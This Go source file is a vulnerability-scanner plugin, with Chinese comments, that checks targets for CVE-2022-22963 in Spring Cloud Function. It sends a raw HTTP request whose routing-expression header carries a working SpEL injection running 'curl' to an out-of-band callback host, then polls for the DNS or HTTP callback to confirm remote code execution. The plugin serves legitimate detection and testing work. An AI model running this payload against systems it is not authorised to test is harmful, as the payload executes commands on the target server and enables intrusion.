// Package cve_2022_22963 是 CVE-2022-22963 Spring Cloud Function SpEL 注入的 Go 插件实现。
//
// 与 YAML 模板的对照:
//   YAML: 3 步 workflow (trigger → verify-dns → verify-http)
//   Go:   2 步 (trigger → verify-dns), 用代码直接轮询 ceye API
//
// Go 插件的优势在此场景:
//   - 可自定义 OOB 等待策略（渐进式重试, 而非固定 delay）
//   - 可在 ceye API 轮询失败时自动重试
//   - 不依赖占位符引擎, 直接用 OOBHandle 接口
package cve_2022_22963

import (
	"context"
	"fmt"
	"time"

	"github.com/gosleek/gosleek/internal/plugin"
	"github.com/gosleek/gosleek/pkg/types"
)

func init() {
	plugin.Register(&CVE202222963{})
}

type CVE202222963 struct{}

func (p *CVE202222963) Meta() types.TemplateMeta {
	return types.TemplateMeta{
		ID:          "CVE-2022-22963-go",
		Name:        "Spring Cloud Function SpEL Injection (OOB, Go)",
		Description: "Spring Cloud Function 3.1.6/3.2.2 通过 spring.cloud.function.routing-expression 头注入 SpEL。Go 插件版: 渐进式 OOB 重试验证。",
		Severity:    "critical",
		Author:      "gosleek",
		Tags:        []string{"cve", "rce", "spel", "spring", "oob"},
		Reference: []string{
			"https://nvd.nist.gov/vuln/detail/CVE-2022-22963",
			"https://tanzu.vmware.com/security/cve-2022-22963",
		},
	}
}

func (p *CVE202222963) Fingerprints() []types.FingerprintRule {
	return nil
}

func (p *CVE202222963) NeedsOOB() bool { return true }

func (p *CVE202222963) Verify(ctx context.Context, pctx *plugin.Context) (*types.Result, error) {
	target := pctx.Target
	hostname := pctx.TargetInfo.Hostname
	reporter := pctx.Reporter
	pctx.Log.Info("目标: %s (hostname=%s)", target, hostname)

	// 检查 OOB 是否可用
	if pctx.Ceye == nil {
		pctx.Log.Info("ceye 未配置, 跳过 OOB 验证 (此模板需要 OOB)")
		return nil, nil
	}

	oobURL := pctx.Ceye.URL()
	oobLabel := pctx.Ceye.Label()
	pctx.Log.Info("OOB DNS: %s (label=%s)", oobURL, oobLabel)

	// SpEL payload: 执行 curl 触发 DNS+HTTP 回连
	spelExpr := fmt.Sprintf(`T(java.lang.Runtime).getRuntime().exec("curl %s")`, oobURL)

	// 步骤 1: 触发 SpEL 注入
	// 注意: spring.cloud.function.routing-expression 头必须全小写
	triggerRaw := fmt.Sprintf(
		"POST /functionRouter HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Accept: */*\r\n"+
			"Accept-Language: en\r\n"+
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"+
			"spring.cloud.function.routing-expression: %s\r\n"+
			"Content-Type: text/plain\r\n"+
			"Connection: close\r\n\r\ntest",
		hostname, spelExpr,
	)
	reporter.LogStep("trigger", 0)
	reporter.LogRequest("trigger", 0, 0, triggerRaw)

	resp, err := pctx.Client.SendRaw(ctx, target, triggerRaw)
	if err != nil {
		reporter.LogResponse("trigger", 0, 0, 0, "", triggerRaw, 0)
		pctx.Log.Debug("trigger 请求失败: %v", err)
		return nil, err
	}
	reporter.LogResponse("trigger", 0, 0, resp.StatusCode, resp.Body, resp.Raw, resp.Time)

	matched := resp.StatusCode >= 200 && resp.StatusCode < 600
	reporter.LogMatch("trigger", 0, 0, matched, "or", []string{"status"},
		fmt.Sprintf("status: %d", resp.StatusCode))
	if !matched {
		pctx.Log.Debug("响应状态码异常 (%d), 可能服务不存在", resp.StatusCode)
		return nil, nil
	}
	pctx.Log.Info("SpEL 触发已发送 (status=%d), 开始 OOB 渐进式轮询...", resp.StatusCode)

	// 步骤 2: 渐进式 OOB DNS 验证
	retryDelays := []time.Duration{3 * time.Second, 5 * time.Second, 8 * time.Second}
	for i, delay := range retryDelays {
		pctx.Log.Debug("等待 %v 后发起第 %d 次 DNS 轮询", delay, i+1)
		select {
		case <-ctx.Done():
			pctx.Log.Debug("上下文已取消")
			return nil, ctx.Err()
		case <-time.After(delay):
		}

		ok, err := pctx.Ceye.VerifyDNS(ctx)
		if err != nil {
			pctx.Log.Debug("ceye DNS API 查询失败 (第 %d 次): %v", i+1, err)
			continue
		}
		if ok {
			pctx.Log.Info("OOB DNS 回连命中 (第 %d 次轮询): %s", i+1, oobLabel)
			return &types.Result{
				TemplateID:  "CVE-2022-22963-go",
				Name:        "Spring Cloud Function SpEL Injection (OOB)",
				Severity:    "critical",
				Description: "Spring Cloud Function 通过 routing-expression 头注入 SpEL 表达式, 导致远程代码执行",
				Target:      target,
				MatchedAt:   time.Now().Format("2006-01-02 15:04:05"),
				Tags:        []string{"cve", "rce", "spel", "spring", "oob"},
				Reference: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2022-22963",
				},
				Evidence:    fmt.Sprintf("OOB DNS 回连确认: %s (第 %d 次轮询命中)", oobLabel, i+1),
				RawRequest:  triggerRaw,
				// RawResponse 留空：漏洞由 OOB 确认，trigger 响应不包含漏洞证据
			}, nil
		}
		pctx.Log.Info("OOB DNS 未命中 (第 %d 次, 等待 %v)", i+1, delay)
	}

	// DNS 未命中, 尝试 HTTP 回连验证
	pctx.Log.Debug("DNS 轮询全部失败, 尝试 HTTP 回连验证")
	ok, err := pctx.Ceye.VerifyHTTP(ctx)
	if err == nil && ok {
		pctx.Log.Info("OOB HTTP 回连命中: %s", oobLabel)
		return &types.Result{
			TemplateID:  "CVE-2022-22963-go",
			Name:        "Spring Cloud Function SpEL Injection (OOB)",
			Severity:    "critical",
			Description: "Spring Cloud Function 通过 routing-expression 头注入 SpEL 表达式, 导致远程代码执行",
			Target:      target,
			MatchedAt:   time.Now().Format("2006-01-02 15:04:05"),
			Tags:        []string{"cve", "rce", "spel", "spring", "oob"},
			Reference: []string{
				"https://nvd.nist.gov/vuln/detail/CVE-2022-22963",
			},
			Evidence:    fmt.Sprintf("OOB HTTP 回连确认: %s", oobLabel),
			RawRequest:  triggerRaw,
			// RawResponse 留空：漏洞由 OOB 确认，trigger 响应不包含漏洞证据
		}, nil
	}
	if err != nil {
		pctx.Log.Debug("ceye HTTP API 错误: %v", err)
	} else {
		pctx.Log.Info("OOB DNS+HTTP 均未命中, 未检出漏洞")
	}

	return nil, nil
}
